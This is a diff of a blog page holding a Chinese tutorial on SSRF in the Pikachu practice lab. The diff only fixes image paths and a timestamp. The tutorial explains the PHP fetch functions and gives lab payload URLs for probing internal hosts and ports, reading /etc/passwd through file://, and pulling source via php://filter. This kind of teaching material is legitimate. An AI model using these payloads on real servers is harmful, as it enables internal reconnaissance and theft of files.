@@ -27,26 +27,26 @@
 <meta property="og:site_name" content="欢 迎 光 临">
 <meta property="og:description" content="SSRF">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110155943810.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110160353697.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110160502725.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110160606691.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110160659978.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110160821031.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110161236533.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110161323352.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110161521819.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110161737693.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110161709266.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110161737693.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110162913976.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110162949382.png">
-<meta property="og:image" content="http://example.com/images%5Cimage-20230110163139174.png">
+<meta property="og:image" content="http://example.com/images/image-20230110155943810.png">
+<meta property="og:image" content="http://example.com/images/image-20230110160353697.png">
+<meta property="og:image" content="http://example.com/images/image-20230110160502725.png">
+<meta property="og:image" content="http://example.com/images/image-20230110160606691.png">
+<meta property="og:image" content="http://example.com/images/image-20230110160659978.png">
+<meta property="og:image" content="http://example.com/images/image-20230110160821031.png">
+<meta property="og:image" content="http://example.com/images/image-20230110161236533.png">
+<meta property="og:image" content="http://example.com/images/image-20230110161323352.png">
+<meta property="og:image" content="http://example.com/images/image-20230110161521819.png">
+<meta property="og:image" content="http://example.com/images/image-20230110161737693.png">
+<meta property="og:image" content="http://example.com/images/image-20230110161709266.png">
+<meta property="og:image" content="http://example.com/images/image-20230110161737693.png">
+<meta property="og:image" content="http://example.com/images/image-20230110162913976.png">
+<meta property="og:image" content="http://example.com/images/image-20230110162949382.png">
+<meta property="og:image" content="http://example.com/images/image-20230110163139174.png">
 <meta property="article:published_time" content="2023-05-04T03:05:49.435Z">
-<meta property="article:modified_time" content="2023-05-04T03:05:49.435Z">
+<meta property="article:modified_time" content="2023-05-04T13:57:34.954Z">
 <meta property="article:author" content="fn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images%5Cimage-20230110155943810.png">
+<meta name="twitter:image" content="http://example.com/images/image-20230110155943810.png">
 
 
 <link rel="canonical" href="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/">
@@ -229,8 +229,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2023-05-04 11:05:49" itemprop="dateCreated datePublished" datetime="2023-05-04T11:05:49+08:00">2023-05-04</time>
+      <time title="创建时间：2023-05-04 11:05:49 / 修改时间：21:57:34" itemprop="dateCreated datePublished" datetime="2023-05-04T11:05:49+08:00">2023-05-04</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -269,7 +270,7 @@
     
     <div class="post-body" itemprop="articleBody">
         <h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><h3 id="服务端请求伪造"><a href="#服务端请求伪造" class="headerlink" title="服务端请求伪造"></a>服务端请求伪造</h3><p>字面意思就是伪造一个服务端请求，即攻击者借由服务端为跳板来攻击目标系统。</p>
-<p><img src="/images%5Cimage-20230110155943810.png" alt="image-20230110155943810"></p>
+<p><img src="/images/image-20230110155943810.png" alt="image-20230110155943810"></p>
 <p>即我们能够访问到服务器，却访问不到目标机，但是服务器能访问到目标机</p>
 <p>比如</p>
 <p>服务器是某公司的公网边界机，目标机是该公司的内网机器</p>
@@ -279,37 +280,37 @@
 <h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p>
 <h3 id="php涉及函数"><a href="#php涉及函数" class="headerlink" title="php涉及函数"></a>php涉及函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>
 
-<h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><img src="/images%5Cimage-20230110160353697.png" alt="image-20230110160353697"></p>
+<h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><img src="/images/image-20230110160353697.png" alt="image-20230110160353697"></p>
 <p>并且可以读取远程文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;http://www.baidu.com&quot;);</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images%5Cimage-20230110160502725.png" alt="image-20230110160502725"></p>
-<h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><p><img src="/images%5Cimage-20230110160606691.png" alt="image-20230110160606691"></p>
+<p><img src="/images/image-20230110160502725.png" alt="image-20230110160502725"></p>
+<h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><p><img src="/images/image-20230110160606691.png" alt="image-20230110160606691"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp = fsockopen(&quot;www.baidu.com&quot;, 80, $errno, $errstr, 30);</span><br><span class="line">if (!$fp) &#123;</span><br><span class="line">    echo &quot;$errstr ($errno)&lt;br /&gt;\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $out = &quot;GET / HTTP/1.1\r\n&quot;;</span><br><span class="line">    $out .= &quot;Host: www.baidu.com\r\n&quot;;</span><br><span class="line">    $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    while (!feof($fp)) &#123;</span><br><span class="line">        echo fgets($fp, 128);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images%5Cimage-20230110160659978.png" alt="image-20230110160659978"></p>
+<p><img src="/images/image-20230110160659978.png" alt="image-20230110160659978"></p>
 <h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><p>用于执行一个cURL会话</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;http://www.baidu.com&quot;);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images%5Cimage-20230110160821031.png" alt="image-20230110160821031"></p>
+<p><img src="/images/image-20230110160821031.png" alt="image-20230110160821031"></p>
 <h1 id="SSRF-CURL"><a href="#SSRF-CURL" class="headerlink" title="SSRF(CURL)"></a>SSRF(CURL)</h1><p>起一台内网主机用于测试</p>
-<p><img src="/images%5Cimage-20230110161236533.png" alt="image-20230110161236533"></p>
+<p><img src="/images/image-20230110161236533.png" alt="image-20230110161236533"></p>
 <p>点击后发现url指定了服务器访问的url，并将结果返回到前端</p>
-<p><img src="/images%5Cimage-20230110161323352.png" alt="image-20230110161323352"></p>
+<p><img src="/images/image-20230110161323352.png" alt="image-20230110161323352"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com</span><br></pre></td></tr></table></figure>
 
 <p>结果返回到前端</p>
-<p><img src="/images%5Cimage-20230110161521819.png" alt="image-20230110161521819"></p>
+<p><img src="/images/image-20230110161521819.png" alt="image-20230110161521819"></p>
 <h3 id="访问内网web"><a href="#访问内网web" class="headerlink" title="访问内网web"></a>访问内网web</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images%5Cimage-20230110161737693.png" alt="image-20230110161737693"></p>
+<p><img src="/images/image-20230110161737693.png" alt="image-20230110161737693"></p>
 <h3 id="探测主机信息"><a href="#探测主机信息" class="headerlink" title="探测主机信息"></a>探测主机信息</h3><h5 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com:4444</span><br></pre></td></tr></table></figure>
 
 <p>baidu未开4444端口，所以会一直加载</p>
-<p><img src="/images%5Cimage-20230110161709266.png" alt="image-20230110161709266"></p>
+<p><img src="/images/image-20230110161709266.png" alt="image-20230110161709266"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images%5Cimage-20230110161737693.png" alt="image-20230110161737693"></p>
+<p><img src="/images/image-20230110161737693.png" alt="image-20230110161737693"></p>
 <p>192.168.28.150主机开启22222端口</p>
 <h3 id="读取主机文件"><a href="#读取主机文件" class="headerlink" title="读取主机文件"></a>读取主机文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
 
@@ -318,14 +319,14 @@
 <h1 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h1><p>利用方式和curl的类似</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=http://www.baidu.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images%5Cimage-20230110162913976.png" alt="image-20230110162913976"></p>
+<p><img src="/images/image-20230110162913976.png" alt="image-20230110162913976"></p>
 <h5 id="探测主机端口"><a href="#探测主机端口" class="headerlink" title="探测主机端口"></a>探测主机端口</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images%5Cimage-20230110162949382.png" alt="image-20230110162949382"></p>
+<p><img src="/images/image-20230110162949382.png" alt="image-20230110162949382"></p>
 <h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=../../index.php</span><br></pre></td></tr></table></figure>
 
 <p>查看页面源代码</p>
-<p><img src="/images%5Cimage-20230110163139174.png" alt="image-20230110163139174"></p>
+<p><img src="/images/image-20230110163139174.png" alt="image-20230110163139174"></p>
 
     </div>
 
